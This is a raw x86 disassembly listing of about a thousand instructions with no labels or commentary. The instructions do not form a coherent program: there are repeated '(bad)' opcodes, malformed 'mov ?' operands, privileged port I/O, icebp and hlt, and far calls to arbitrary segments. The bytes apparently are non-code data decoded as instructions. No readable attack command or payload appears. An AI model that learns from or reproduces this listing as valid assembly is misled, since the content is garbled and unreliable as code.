  40c4a0:	cmc    
  40c4a1:	cdq    
  40c4a2:	mov    cl,0x9b
  40c4a4:	fcmovnbe st,st(4)
  40c4a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4a7:	inc    esp
  40c4a8:	lock xchg edx,eax
  40c4aa:	jnp    0x40c4b3
  40c4ac:	lods   al,BYTE PTR ds:[esi]
  40c4ad:	cmp    eax,0xed139e7d
  40c4b2:	sub    ecx,DWORD PTR [edx]
  40c4b4:	xor    esi,ebp
  40c4b6:	pop    ebx
  40c4b7:	push   esi
  40c4b8:	mov    edx,0x4a1437c4
  40c4bd:	xchg   ecx,eax
  40c4be:	scas   al,BYTE PTR es:[edi]
  40c4bf:	std    
  40c4c0:	fcom   DWORD PTR [esp+ebx*4+0x2a2b121d]
  40c4c7:	in     al,0x1e
  40c4c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4ca:	dec    ebx
  40c4cb:	jge    0x40c4f1
  40c4cd:	add    eax,0xa6e50b43
  40c4d2:	jecxz  0x40c4e8
  40c4d4:	mov    dl,0xe2
  40c4d6:	outs   dx,DWORD PTR ds:[esi]
  40c4d7:	or     eax,0xcf12680f
  40c4dc:	and    eax,0x7ba0ab3d
  40c4e1:	mov    ch,0xff
  40c4e3:	pop    es
  40c4e4:	or     eax,0x4b7658fb
  40c4e9:	mov    eax,ds:0x46b1ed59
  40c4ee:	loopne 0x40c4a7
  40c4f0:	xchg   ebx,eax
  40c4f1:	and    eax,0xffffffae
  40c4f4:	jge    0x40c53e
  40c4f6:	adc    DWORD PTR [edx],esi
  40c4f8:	mov    DWORD PTR [edi],edi
  40c4fa:	dec    esp
  40c4fb:	sbb    BYTE PTR [eax],ch
  40c4fd:	add    BYTE PTR [edx-0x7cb93275],cl
  40c503:	jge    0x40c532
  40c505:	jecxz  0x40c4e9
  40c507:	addr16 (bad) 
  40c509:	out    0x70,eax
  40c50b:	cmc    
  40c50c:	inc    ebp
  40c50d:	xor    eax,0x8c25311d
  40c512:	sub    BYTE PTR [eax-0x5d],0x12
  40c516:	leave  
  40c517:	sub    ebx,ecx
  40c519:	ss call 0xc611:0x1ad51e3a
  40c521:	pop    ebp
  40c522:	clc    
  40c523:	pop    ebx
  40c524:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c525:	add    edx,DWORD PTR [ebx]
  40c527:	xchg   DWORD PTR [esi+edi*4],ebx
  40c52a:	and    eax,edi
  40c52c:	push   edx
  40c52d:	not    DWORD PTR [ebp+0x3b]
  40c530:	loop   0x40c583
  40c532:	int    0x2d
  40c534:	div    BYTE PTR [edi]
  40c536:	pushf  
  40c537:	mov    dl,0x8c
  40c539:	mov    esp,0xafd038b0
  40c53e:	es xchg ebx,eax
  40c540:	pop    ecx
  40c541:	inc    edi
  40c542:	inc    ebx
  40c543:	fwait
  40c544:	imul   edi,DWORD PTR [ebx-0x28],0xf57578e2
  40c54b:	inc    esi
  40c54c:	rcr    BYTE PTR [esi-0x112554dd],0x10
  40c553:	xchg   esi,eax
  40c555:	xchg   esp,eax
  40c556:	xchg   BYTE PTR [ebp+0x414bab56],bh
  40c55c:	add    al,0xb5
  40c55e:	inc    ecx
  40c55f:	sbb    DWORD PTR [ecx-0xe],edi
  40c562:	and    eax,0xb9c70a13
  40c567:	call   0xa71b5bcb
  40c56c:	pop    edi
  40c56d:	icebp  
  40c56e:	cli    
  40c56f:	retf   0x204c
  40c572:	pop    edi
  40c573:	mov    esi,0x89a25f02
  40c578:	loopne 0x40c5f6
  40c57a:	enter  0xadf4,0x3e
  40c57e:	outs   dx,BYTE PTR ds:[esi]
  40c57f:	std    
  40c580:	push   edx
  40c581:	or     DWORD PTR [esi-0x5f],esp
  40c584:	lds    eax,FWORD PTR [edi+0x68a15c97]
  40c58a:	adc    ah,bl
  40c58c:	xor    dh,BYTE PTR [eax-0x16]
  40c58f:	mov    ah,0x36
  40c591:	sbb    DWORD PTR [eax+0xda0e5a4],esi
  40c597:	cdq    
  40c598:	jo     0x40c52b
  40c59a:	jp     0x40c5bd
  40c59c:	in     al,0x1b
  40c59e:	lea    edx,[ebx+0x7e]
  40c5a1:	xor    ebx,edx
  40c5a3:	add    al,0xe8
  40c5a5:	jne    0x40c5c0
  40c5a7:	cdq    
  40c5a8:	ficom  WORD PTR [esi]
  40c5aa:	pop    ss
  40c5ab:	retf   
  40c5ac:	pop    eax
  40c5ad:	mov    ah,0xbe
  40c5af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5b0:	stos   DWORD PTR es:[edi],eax
  40c5b1:	inc    edx
  40c5b2:	fcomp  DWORD PTR [edx]
  40c5b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5b5:	in     eax,dx
  40c5b6:	cld    
  40c5b7:	out    0xb7,eax
  40c5b9:	daa    
  40c5ba:	jbe    0x40c632
  40c5bc:	outs   dx,DWORD PTR ds:[esi]
  40c5bd:	ss loopne 0x40c615
  40c5c0:	retf   
  40c5c1:	std    
  40c5c2:	test   BYTE PTR [edx+ecx*2-0x37],0x16
  40c5c7:	mov    ds:0x8f43c0bd,eax
  40c5cc:	aam    0xd6
  40c5ce:	fs or  edi,ebp
  40c5d1:	jne    0x40c64a
  40c5d3:	push   edi
  40c5d4:	push   0xffffff9e
  40c5d6:	mov    ch,0xcd
  40c5d8:	out    dx,al
  40c5d9:	mov    cl,0x7b
  40c5db:	pop    ss
  40c5dc:	scas   al,BYTE PTR es:[edi]
  40c5dd:	inc    edx
  40c5de:	enter  0x698a,0xb4
  40c5e2:	nop
  40c5e3:	sti    
  40c5e4:	pop    es
  40c5e5:	cld    
  40c5e6:	sub    al,0x29
  40c5e8:	pop    eax
  40c5e9:	(bad)  
  40c5ea:	enter  0x1cd3,0xe3
  40c5ee:	call   0xe6bc:0x3f8767f
  40c5f5:	mov    BYTE PTR [ebx-0x7384ff60],ch
  40c5fb:	or     eax,0x8d179a07
  40c600:	xchg   edx,eax
  40c601:	adc    DWORD PTR [esi+0x74],ecx
  40c604:	sub    eax,0xc17e32e2
  40c609:	xor    BYTE PTR [esi],ah
  40c60b:	mov    edx,0x38f72e7f
  40c610:	cmovs  ebx,DWORD PTR [esi]
  40c613:	dec    esp
  40c614:	sbb    al,0x2b
  40c616:	and    ecx,DWORD PTR [edi+eiz*1-0x3c]
  40c61a:	test   BYTE PTR [edx],0x42
  40c61d:	push   cs
  40c61e:	cwde   
  40c61f:	call   0xf416:0xbd21ed10
  40c626:	retf   
  40c627:	fldenv [ebx]
  40c629:	push   ebp
  40c62a:	sub    cl,ch
  40c62c:	fnstcw WORD PTR [eax-0x38]
  40c62f:	add    DWORD PTR ds:0xee1a469d,ecx
  40c635:	mov    al,0x5b
  40c637:	mov    ch,0x4a
  40c639:	mov    al,ds:0xa6610701
  40c63e:	je     0x40c69c
  40c640:	sbb    eax,0x54d9b4b1
  40c645:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c647:	or     eax,0x3d50b1b1
  40c64c:	xchg   ecx,eax
  40c64d:	sbb    DWORD PTR [ecx+edx*4],edx
  40c650:	mov    dl,dh
  40c652:	jecxz  0x40c69f
  40c654:	pushf  
  40c655:	js     0x40c67c
  40c657:	xchg   DWORD PTR [eax],eax
  40c659:	add    eax,0x21483e72
  40c65e:	aam    0x32
  40c660:	or     al,0xea
  40c662:	ror    BYTE PTR [edx-0x1d9ca94c],0xe8
  40c669:	cld    
  40c66a:	pushf  
  40c66b:	cld    
  40c66c:	leave  
  40c66d:	xchg   BYTE PTR [edx+eiz*4-0x57],cl
  40c671:	sbb    BYTE PTR [edx+0x7f],bl
  40c674:	push   ebp
  40c675:	into   
  40c676:	mov    eax,ss:0xc5d44bdb
  40c67c:	clc    
  40c67d:	out    dx,al
  40c67e:	loope  0x40c6d6
  40c680:	cwde   
  40c681:	xchg   esp,eax
  40c682:	outs   dx,DWORD PTR ds:[esi]
  40c683:	rcr    DWORD PTR [edi],0xfd
  40c686:	pop    ds
  40c687:	pop    edx
  40c688:	cmp    bh,BYTE PTR [ebx+0x66b25e3c]
  40c68e:	mov    al,ds:0x1f89a128
  40c693:	mov    ds:0xb60f8c6b,eax
  40c698:	ror    BYTE PTR [ebx],0xd6
  40c69b:	scas   eax,DWORD PTR es:[edi]
  40c69c:	shr    ecx,cl
  40c69e:	add    DWORD PTR [eax+edx*8-0x192f4e13],0x650012fb
  40c6a9:	sub    BYTE PTR [eax],0xda
  40c6ac:	stos   BYTE PTR es:[edi],al
  40c6ad:	sbb    BYTE PTR [ebx+0x29ca4d0f],bh
  40c6b3:	jnp    0x40c6e3
  40c6b5:	mov    edx,0x21f9321d
  40c6ba:	out    0x10,eax
  40c6bc:	fcom   DWORD PTR [edx]
  40c6be:	stos   BYTE PTR es:[edi],al
  40c6bf:	inc    edi
  40c6c0:	fwait
  40c6c1:	or     eax,0xcc532d72
  40c6c6:	mov    edx,0x58ce6d14
  40c6cb:	adc    al,0x1e
  40c6cd:	jo     0x40c6f6
  40c6cf:	test   eax,0xe94eda6f
  40c6d4:	xor    eax,0x60a68921
  40c6d9:	fucomip st,st(5)
  40c6db:	xchg   esp,eax
  40c6dc:	cs cs push esp
  40c6df:	jp     0x40c6c2
  40c6e1:	sbb    dh,BYTE PTR [ebx]
  40c6e3:	xchg   ecx,eax
  40c6e4:	sbb    bh,BYTE PTR [edi+edx*1+0x3ba8813a]
  40c6eb:	add    eax,0x547c2830
  40c6f0:	clc    
  40c6f1:	and    BYTE PTR [edi-0x6c],0x8f
  40c6f5:	xchg   edx,eax
  40c6f6:	call   0xe6fd:0xf8ecb86a
  40c6fd:	fisttp WORD PTR ss:[ebx-0x63d37129]
  40c704:	push   0x6bea1c5a
  40c709:	xor    al,0x2e
  40c70b:	mov    al,ds:0x283dadc7
  40c710:	mov    bh,BYTE PTR [eax+0x141e20e4]
  40c716:	pop    edi
  40c717:	ins    DWORD PTR es:[edi],dx
  40c718:	xor    eax,0x2d238b8c
  40c71d:	into   
  40c71e:	inc    esp
  40c71f:	mov    ebp,0x820f4a7e
  40c724:	je     0x40c776
  40c726:	hlt    
  40c727:	add    DWORD PTR [eax+eiz*1+0x79f21188],edi
  40c72e:	das    
  40c72f:	cmp    bh,BYTE PTR [eax]
  40c731:	push   0xffffffd5
  40c733:	mov    ds:0x30fcbac5,al
  40c738:	xor    eax,DWORD PTR [eax-0x76]
  40c73b:	dec    esp
  40c73d:	test   al,0x43
  40c73f:	jg     0x40c724
  40c741:	mov    es,WORD PTR [ebp-0x1cda69f5]
  40c747:	xchg   edi,eax
  40c748:	addr16 jns 0x40c73a
  40c74b:	xchg   ebx,eax
  40c74c:	push   ecx
  40c74d:	xor    DWORD PTR [ebp+esi*1+0x70],ebp
  40c751:	sub    ecx,esi
  40c753:	mov    bl,al
  40c755:	imul   edx,DWORD PTR [edi-0x1662120c],0xf9ce0c48
  40c75f:	pop    ebp
  40c760:	push   0x2f
  40c762:	jg     0x40c714
  40c764:	push   esp
  40c765:	data16 and al,BYTE PTR [edi-0x32d46bd9]
  40c76c:	scas   eax,DWORD PTR es:[edi]
  40c76d:	push   0xffffffae
  40c76f:	dec    edi
  40c770:	push   cs
  40c771:	ret    
  40c772:	ja     0x40c7ae
  40c774:	test   dh,0xb
  40c777:	out    0x47,eax
  40c779:	rol    BYTE PTR ds:0x48b27127,cl
  40c77f:	sar    BYTE PTR [ecx+ebx*2+0x26fd1fbd],0xab
  40c787:	add    al,al
  40c789:	call   0x41de9f9e
  40c78e:	xchg   edi,eax
  40c78f:	adc    eax,0x56c232e8
  40c794:	scas   eax,DWORD PTR es:[edi]
  40c795:	add    al,0x4
  40c797:	jo     0x40c7d1
  40c799:	aam    0xad
  40c79b:	imul   ecx,DWORD PTR [edx-0xffb58d9],0xb009984f
  40c7a5:	dec    ebx
  40c7a6:	sbb    DWORD PTR [ebx],esi
  40c7a8:	inc    eax
  40c7a9:	fisub  DWORD PTR [ebx]
  40c7ab:	inc    ecx
  40c7ac:	pop    ss
  40c7ad:	mov    al,ds:0xa2ad4d3a
  40c7b2:	loope  0x40c746
  40c7b4:	xor    ebp,edx
  40c7b6:	out    dx,eax
  40c7b7:	push   es
  40c7b8:	adc    eax,DWORD PTR [ebp-0x54137406]
  40c7be:	cmp    edi,DWORD PTR [edi]
  40c7c0:	pop    edx
  40c7c1:	(bad)  
  40c7c2:	dec    esi
  40c7c3:	pop    ds
  40c7c4:	fild   DWORD PTR [edx-0x550170c5]
  40c7ca:	out    0xfd,eax
  40c7cc:	pop    ebx
  40c7cd:	xchg   esi,eax
  40c7ce:	scas   al,BYTE PTR es:[edi]
  40c7cf:	outs   dx,BYTE PTR ds:[esi]
  40c7d0:	push   ds
  40c7d1:	jne    0x40c773
  40c7d3:	test   al,0xbe
  40c7d5:	arpl   WORD PTR [ecx+edx*2],bp
  40c7d8:	push   0xffffffb9
  40c7da:	add    dl,BYTE PTR [esi]
  40c7dc:	xor    al,0x21
  40c7de:	cmp    al,0x84
  40c7e0:	adc    eax,0xe3676f5e
  40c7e5:	out    0x6e,eax
  40c7e7:	sbb    esi,edx
  40c7e9:	call   0x47152f23
  40c7ee:	push   eax
  40c7ef:	addr16 xor ecx,ebp
  40c7f2:	sbb    eax,0x22baeb8c
  40c7f7:	mov    ch,cl
  40c7f9:	aam    0x7c
  40c7fb:	imul   edx,eax,0x2b
  40c7fe:	aam    0xa6
  40c800:	aad    0x3f
  40c802:	(bad)
  40c805:	shl    dl,0x31
  40c808:	xchg   ebp,eax
  40c809:	arpl   WORD PTR [ebx-0x2d],cx
  40c80c:	sbb    dh,BYTE PTR [edx+edi*2]
  40c80f:	loopne 0x40c79f
  40c811:	mov    esi,0x3b1d4306
  40c816:	test   al,0x6b
  40c818:	ja     0x40c7d2
  40c81a:	and    BYTE PTR [ebx],bl
  40c81c:	dec    ecx
  40c81d:	or     edx,eax
  40c81f:	fcomip st,st(3)
  40c821:	sbb    ah,dh
  40c823:	mov    DWORD PTR [eax+esi*4-0x336ab2e4],edi
  40c82a:	pop    esp
  40c82b:	popf   
  40c82c:	icebp  
  40c82d:	out    dx,al
  40c82e:	js     0x40c823
  40c830:	pusha  
  40c831:	std    
  40c832:	rcr    dl,1
  40c834:	icebp  
  40c835:	ds sub ebx,edx
  40c838:	rcr    DWORD PTR [edx+edx*1+0x251d63d9],cl
  40c83f:	or     al,0x34
  40c841:	sbb    al,bl
  40c843:	pushf  
  40c844:	in     eax,dx
  40c845:	in     eax,0x21
  40c847:	ja     0x40c862
  40c849:	pop    eax
  40c84a:	and    bh,bl
  40c84c:	sbb    BYTE PTR [eax],ah
  40c84e:	cmp    ch,cl
  40c850:	mul    ebp
  40c852:	cwde   
  40c853:	pop    es
  40c854:	aam    0x63
  40c856:	jbe    0x40c822
  40c858:	jmp    0x40c877
  40c85a:	cmp    eax,0xe5808f56
  40c85f:	mov    ds:0x6a191099,eax
  40c864:	xlat   BYTE PTR ds:[ebx]
  40c865:	pop    ecx
  40c866:	in     al,0x8
  40c868:	pop    esi
  40c869:	popf   
  40c86a:	sbb    ah,BYTE PTR [esi+0x13]
  40c86d:	sbb    eax,0xc6dc1c3
  40c872:	scas   al,BYTE PTR es:[edi]
  40c873:	lods   eax,DWORD PTR ds:[esi]
  40c874:	pop    ebp
  40c875:	es cwde 
  40c877:	adc    eax,0xb996dd9b
  40c87c:	loop   0x40c8af
  40c87e:	hlt    
  40c87f:	xchg   esp,eax
  40c880:	rcl    BYTE PTR [edi+0x65],cl
  40c883:	jno    0x40c87e
  40c885:	sbb    DWORD PTR [edi],0x57
  40c888:	mov    ah,0x71
  40c88a:	sub    BYTE PTR [eax+0x64d436f3],cl
  40c890:	loop   0x40c854
  40c892:	push   es
  40c893:	lahf   
  40c894:	loop   0x40c8d1
  40c896:	push   0xffffffef
  40c898:	mov    ecx,0xaade8842
  40c89d:	pop    esi
  40c89e:	out    0x9d,al
  40c8a0:	push   ds
  40c8a1:	or     ah,BYTE PTR [edx+0x27]
  40c8a4:	jge    0x40c8ca
  40c8a6:	int3   
  40c8a7:	xchg   ebp,eax
  40c8a8:	xor    eax,0x468aa163
  40c8ad:	sub    DWORD PTR [edi+ebx*4+0x56],edi
  40c8b1:	push   eax
  40c8b2:	aas    
  40c8b3:	ins    BYTE PTR es:[edi],dx
  40c8b4:	mov    eax,ds:0x549cdbfc
  40c8b9:	mov    ?,WORD PTR [esi+esi*8-0x4d1ae1bc]
  40c8c0:	mov    cl,0x71
  40c8c2:	sar    DWORD PTR [esi-0x1],1
  40c8c5:	sub    edi,DWORD PTR [ebx]
  40c8c7:	and    ebp,DWORD PTR [ecx+ebp*2-0x5c0ec37b]
  40c8ce:	sub    al,0xb7
  40c8d0:	push   ebx
  40c8d1:	sbb    ah,BYTE PTR [ecx-0x31bebcd1]
  40c8d7:	into   
  40c8d8:	ins    DWORD PTR es:[edi],dx
  40c8d9:	mov    ds:0x8905dbe5,al
  40c8de:	aas    
  40c8df:	adc    bl,BYTE PTR [ebp+0x45735e0c]
  40c8e5:	inc    ebp
  40c8e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8e7:	aas    
  40c8e8:	mov    WORD PTR [ebx],cs
  40c8ea:	xor    al,0x7b
  40c8ec:	pop    eax
  40c8ed:	iret   
  40c8ee:	add    BYTE PTR [edx-0x6a],dl
  40c8f1:	adc    esp,esi
  40c8f3:	fidiv  DWORD PTR [ecx+0x1a]
  40c8f6:	push   0xffffff87
  40c8f8:	ja     0x40c888
  40c8fa:	pop    esp
  40c8fb:	xor    bh,BYTE PTR [esi]
  40c8fd:	hlt    
  40c8fe:	mov    ch,0x3a
  40c900:	or     cl,BYTE PTR [esi+0x19f1680e]
  40c906:	nop
  40c907:	cmp    BYTE PTR [ecx+0x27588c9e],ah
  40c90d:	sar    BYTE PTR [esi-0x65],0x9e
  40c911:	inc    ecx
  40c912:	stos   BYTE PTR es:[edi],al
  40c913:	popf   
  40c914:	or     ah,dl
  40c916:	inc    edi
  40c917:	test   esi,ebp
  40c919:	mov    ebp,0xcefe8d33
  40c91e:	sub    edx,esi
  40c920:	dec    esp
  40c921:	pop    ecx
  40c922:	jge    0x40c906
  40c924:	sub    BYTE PTR [eax+0x187b70cd],0x13
  40c92b:	ins    BYTE PTR es:[edi],dx
  40c92c:	repz push es
  40c92e:	or     edx,DWORD PTR [edi]
  40c930:	dec    edx
  40c931:	lock dec ecx
  40c933:	arpl   WORD PTR [ebx-0x61],si
  40c936:	scas   al,BYTE PTR es:[edi]
  40c937:	retf   0xb374
  40c93a:	ins    DWORD PTR es:[edi],dx
  40c93b:	pop    esp
  40c93c:	cmp    edx,DWORD PTR [edx+ecx*8+0x42742d9a]
  40c943:	mov    al,ds:0x3849e987
  40c948:	icebp  
  40c949:	sti    
  40c94a:	jmp    DWORD PTR [ebx+0xafb7226]
  40c950:	inc    ebp
  40c951:	mov    dl,0x5d
  40c953:	leave  
  40c954:	imul   ebx,eax,0xffffff8e
  40c957:	and    eax,0x66862408
  40c95c:	out    0xc6,al
  40c95e:	pop    edi
  40c95f:	fimul  DWORD PTR [esi-0x3]
  40c962:	imul   edi,ecx,0x9ab51f34
  40c968:	hlt    
  40c969:	mov    esp,0xeb5a3a8e
  40c96e:	sbb    edx,DWORD PTR [esi+0x69]
  40c971:	pop    ebx
  40c972:	loope  0x40c986
  40c974:	mov    ?,WORD PTR [eax+0x2c]
  40c977:	or     BYTE PTR [ecx-0x60],bl
  40c97a:	loopne 0x40c9bf
  40c97c:	popa   
  40c97d:	aas    
  40c97e:	ins    BYTE PTR es:[edi],dx
  40c97f:	daa    
  40c980:	test   eax,0x9c26559d
  40c985:	sbb    DWORD PTR [edi-0x18],ebp
  40c988:	pop    ds
  40c989:	push   es
  40c98a:	jno    0x40c979
  40c98c:	mov    cl,0x0
  40c98e:	mov    eax,0x63b91d03
  40c993:	ja     0x40c9a8
  40c995:	dec    ecx
  40c996:	mov    ebp,0xc5c4a807
  40c99b:	mov    bh,0xac
  40c99d:	fcmovnu st,st(0)
  40c99f:	inc    ebp
  40c9a0:	js     0x40c96a
  40c9a2:	push   ecx
  40c9a3:	add    edi,DWORD PTR [ecx-0x38]
  40c9a6:	aam    0x71
  40c9a8:	int3   
  40c9a9:	mov    bh,0xe4
  40c9ab:	xor    al,0xc0
  40c9ad:	push   ebx
  40c9ae:	cld    
  40c9af:	out    0x5a,al
  40c9b1:	(bad)  
  40c9b3:	dec    ebx
  40c9b4:	inc    ecx
  40c9b5:	mov    BYTE PTR [eax+ecx*8+0x18],bh
  40c9b9:	cmp    ebx,DWORD PTR [ebx-0x5b]
  40c9bc:	mov    eax,0xd68d4011
  40c9c1:	add    eax,0x74b13d04
  40c9c6:	sub    esp,DWORD PTR [ebp-0x61]
  40c9c9:	dec    esp
  40c9ca:	sub    edi,DWORD PTR [edx-0x1af4fa4f]
  40c9d0:	sbb    al,0xd9
  40c9d2:	icebp  
  40c9d3:	inc    esi
  40c9d4:	cmp    ah,BYTE PTR [ebx+0x29]
  40c9d7:	repnz retf 
  40c9d9:	adc    al,0x96
  40c9db:	iret   
  40c9dc:	cdq    
  40c9dd:	jo     0x40ca0d
  40c9df:	pop    eax
  40c9e0:	mov    BYTE PTR [esi-0x13],cl
  40c9e3:	and    bl,BYTE PTR [ecx]
  40c9e5:	popf   
  40c9e6:	jb     0x40ca23
  40c9e8:	cld    
  40c9e9:	in     eax,0x2f
  40c9eb:	(bad)  
  40c9ee:	sar    DWORD PTR [esi],1
  40c9f0:	fidivr DWORD PTR [edi-0x26]
  40c9f3:	cdq    
  40c9f4:	xchg   esp,eax
  40c9f5:	add    edx,esp
  40c9f7:	xchg   DWORD PTR [ecx+0x20],edi
  40c9fa:	mov    ah,0x6c
  40c9fc:	lahf   
  40c9fd:	sbb    DWORD PTR [edx-0x532a589e],ecx
  40ca03:	addr16 push es
  40ca05:	fmul   QWORD PTR [esi-0x23b53c12]
  40ca0b:	hlt    
  40ca0c:	mov    ch,0xf
  40ca0e:	es retf 0x9e00
  40ca12:	stc    
  40ca13:	ret    
  40ca14:	fidiv  WORD PTR cs:[edi+0x18]
  40ca18:	enter  0x4d79,0x37
  40ca1c:	cmp    DWORD PTR [ebp-0x36b5ec3f],edi
  40ca22:	sub    al,0xbc
  40ca24:	add    esp,0xffffffa2
  40ca27:	push   edx
  40ca28:	xor    BYTE PTR [esp+ecx*4+0x65],al
  40ca2c:	mov    bl,BYTE PTR [edx-0x65]
  40ca2f:	jle    0x40ca05
  40ca31:	and    ebx,DWORD PTR [esi+0x73f48214]
  40ca37:	sti    
  40ca38:	dec    esi
  40ca39:	imul   edi,esi,0xe7770ab7
  40ca3f:	cwde   
  40ca40:	cs ss add eax,0x7db7cb40
  40ca47:	sub    BYTE PTR [ebp+0x34],ch
  40ca4a:	aad    0xad
  40ca4c:	mov    bh,0xa6
  40ca4e:	cmp    ecx,DWORD PTR [eax+0x72]
  40ca51:	in     al,dx
  40ca52:	shr    BYTE PTR [ebx+0x8],0x2d
  40ca56:	xchg   BYTE PTR [eax+0x59895944],cl
  40ca5c:	adc    BYTE PTR [edi-0xa],al
  40ca5f:	mov    DWORD PTR [ebp+0x4f],ecx
  40ca62:	call   0x6075:0x8440b7f1
  40ca69:	cs add al,0x9a
  40ca6c:	into   
  40ca6d:	add    ebp,esi
  40ca6f:	adc    eax,ebp
  40ca71:	cmp    bl,cl
  40ca73:	(bad)  
  40ca74:	pop    esi
  40ca75:	lahf   
  40ca76:	sbb    DWORD PTR [esi+0x1ac38e71],edi
  40ca7c:	test   DWORD PTR [ecx+0x3e],0xb73bbec3
  40ca83:	test   al,0xd1
  40ca85:	sahf   
  40ca86:	mov    dl,0x4a
  40ca88:	and    al,0xaf
  40ca8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca8b:	push   es
  40ca8c:	pop    eax
  40ca8d:	data16 jne 0x40ca9d
  40ca90:	div    DWORD PTR [eax-0x2d]
  40ca93:	xchg   BYTE PTR [ebp-0x5f678ce5],ah
  40ca99:	gs or  eax,0x3caa2452
  40ca9f:	aas    
  40caa0:	mov    ds:0xc65900e3,al
  40caa5:	pop    ds
  40caa6:	or     al,0x83
  40caa8:	mov    dl,0x52
  40caaa:	push   ecx
  40caab:	or     eax,0xd4f59313
  40cab0:	div    DWORD PTR ds:0x5700663b
  40cab6:	xchg   edi,eax
  40cab7:	mov    esi,0xfcc1dc74
  40cabc:	and    al,0xab
  40cabe:	lahf   
  40cabf:	jb     0x40ca5b
  40cac1:	jno    0x40ca5a
  40cac3:	fwait
  40cac4:	addr16 jne 0x40ca7e
  40cac7:	iret   
  40cac8:	fild   DWORD PTR [esi]
  40caca:	in     al,0xe0
  40cacc:	sbb    BYTE PTR [edi+0x48b4787f],dl
  40cad2:	mov    edx,0x4a2268b
  40cad7:	add    al,BYTE PTR [ebx-0x6d]
  40cada:	(bad)  
  40cadb:	(bad)  
  40cadc:	add    DWORD PTR [esi],edi
  40cade:	push   ecx
  40cadf:	loopne 0x40cb58
  40cae1:	mov    ebp,0x7499640
  40cae6:	in     eax,dx
  40cae7:	sub    eax,0xdbd8645e
  40caec:	retf   0xf4d3
  40caef:	sub    bl,BYTE PTR [edi]
  40caf1:	jbe    0x40cb2b
  40caf3:	xor    DWORD PTR [eax+edi*8-0x7d],ebp
  40caf7:	retf   
  40caf8:	sti    
  40caf9:	mov    al,0x2c
  40cafb:	jg     0x40ca7d
  40cafd:	adc    bl,dh
  40caff:	lods   eax,DWORD PTR ds:[esi]
  40cb00:	add    BYTE PTR [edi-0x1cc3f87],bh
  40cb06:	mov    cl,al
  40cb08:	push   eax
  40cb09:	add    eax,0xa7998296
  40cb0e:	xor    ecx,esp
  40cb10:	jmp    0x6b66:0xec8b343e
  40cb17:	push   esi
  40cb18:	push   ebx
  40cb19:	addr16 mov bh,0x2a
  40cb1c:	xchg   esp,eax
  40cb1d:	daa    
  40cb1e:	add    eax,0x1a940a23
  40cb23:	dec    eax
  40cb24:	xor    al,0x70
  40cb26:	cmp    ecx,DWORD PTR [eax+0x7358cab1]
  40cb2c:	movq   mm4,mm5
  40cb2f:	std    
  40cb30:	retf   
  40cb31:	or     DWORD PTR [esp+ebx*8+0x33],ebx
  40cb35:	out    0x28,eax
  40cb37:	jle    0x40cb04
  40cb39:	ret    
  40cb3a:	inc    esi
  40cb3b:	fstp   TBYTE PTR [ecx]
  40cb3d:	aas    
  40cb3e:	leave  
  40cb3f:	cs and cl,ah
  40cb42:	test   BYTE PTR [edi-0x4d42a30a],al
  40cb48:	inc    esi
  40cb49:	out    dx,al
  40cb4a:	stc    
  40cb4b:	xchg   DWORD PTR [edx-0x78],edx
  40cb4e:	jne    0x40cb01
  40cb50:	das    
  40cb51:	fidivr WORD PTR [edi+0x6760d6dd]
  40cb57:	mov    BYTE PTR [edx+0x42],ch
  40cb5a:	rcr    DWORD PTR [edi*8-0x5aa68ed9],1
  40cb61:	xchg   ebx,eax
  40cb62:	sbb    BYTE PTR [esi+esi*2+0x12b47b4e],dl
  40cb69:	or     dh,bh
  40cb6b:	cmp    eax,0x21d1a0af
  40cb70:	adc    al,0x94
  40cb72:	jg     0x40cb6b
  40cb74:	mov    eax,0x49909626
  40cb79:	ins    BYTE PTR es:[edi],dx
  40cb7a:	pusha  
  40cb7b:	loopne 0x40cb67
  40cb7d:	dec    ecx
  40cb7e:	xchg   ecx,eax
  40cb7f:	js     0x40cb5e
  40cb81:	mov    ds:0x1f894b9b,al
  40cb86:	bound  ebp,QWORD PTR [eax]
  40cb88:	std    
  40cb89:	cdq    
  40cb8a:	data16 ds cli 
  40cb8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb8e:	xchg   BYTE PTR [ebx],cl
  40cb90:	or     edi,DWORD PTR [eax+0x5f]
  40cb93:	add    ah,ah
  40cb95:	cmp    BYTE PTR [eax+0x3e],bl
  40cb98:	arpl   WORD PTR [ecx+0x64],cx
  40cb9b:	popa   
  40cb9c:	dec    edx
  40cb9d:	in     al,dx
  40cb9e:	pop    es
  40cb9f:	add    DWORD PTR [eax-0x38],0xffffff94
  40cba3:	arpl   ax,di
  40cba5:	mov    dl,0x1f
  40cba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cba8:	arpl   bp,sp
  40cbaa:	stc    
  40cbab:	mov    cs,WORD PTR [edx]
  40cbad:	daa    
  40cbae:	push   edi
  40cbaf:	out    0x7,eax
  40cbb1:	fucomi st,st(6)
  40cbb3:	inc    edi
  40cbb4:	mov    al,0x72
  40cbb6:	mov    al,ds:0x5642c189
  40cbbb:	popa   
  40cbbc:	xchg   edx,eax
  40cbbd:	(bad)  
  40cbbe:	(bad)  
  40cbbf:	cmp    al,0xf0
  40cbc1:	(bad)  
  40cbc2:	mov    bh,0x56
  40cbc4:	popf   
  40cbc5:	retf   0x1ee2
  40cbc8:	mov    ds:0x47dbf890,eax
  40cbcd:	push   es
  40cbce:	stos   BYTE PTR es:[edi],al
  40cbcf:	test   al,0x74
  40cbd1:	call   0x984d9e3e
  40cbd6:	pop    eax
  40cbd7:	outs   dx,BYTE PTR ds:[esi]
  40cbd8:	dec    ecx
  40cbd9:	jecxz  0x40cc1a
  40cbdb:	ficomp DWORD PTR [ecx-0x14]
  40cbde:	sbb    ebx,edx
  40cbe0:	inc    ebx
  40cbe1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbe2:	dec    edx
  40cbe3:	sbb    al,BYTE PTR [edi+0xb1ef851]
  40cbe9:	sub    al,0xf6
  40cbeb:	(bad)  
  40cbed:	loopne 0x40cc61
  40cbef:	and    ebp,DWORD PTR [ecx+0x3d84c0a8]
